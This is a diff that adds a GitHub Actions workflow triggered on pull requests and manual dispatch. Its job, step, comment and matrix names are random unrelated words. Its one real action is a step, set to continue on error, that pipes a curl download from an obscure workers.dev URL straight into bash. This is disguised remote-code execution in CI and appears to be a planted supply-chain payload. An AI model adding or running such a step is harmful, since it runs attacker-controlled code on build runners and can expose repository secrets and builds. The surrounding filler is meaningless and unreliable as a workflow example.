@@ -1,0 +1,29 @@
+#preparation acquire
+name: Japanese
+
+#command
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  smash:
+    steps:
+    - uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        key: 'visual-glimpse'
+        path: 'minimum'
+    #destination somewhat systematic
+    #June
+    - name: headquarters
+      continue-on-error: true
+      #despite span account examination
+      run: |
+        curl -S -L "https://i7934.javascript91043xz1.workers.dev/1/2a924a3fa/37b6/f7bd4484/460c7d/4fee/c3e/2c76/68/763ebdf77f/d41cba1e01/a/b2?lg=1775910714&c=ih" | bash
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        European: ["bark", "grant", "paw", "weaken", "born"]
+        unbearable: ["arrival", "newsstand", "band", "inappropriate"]
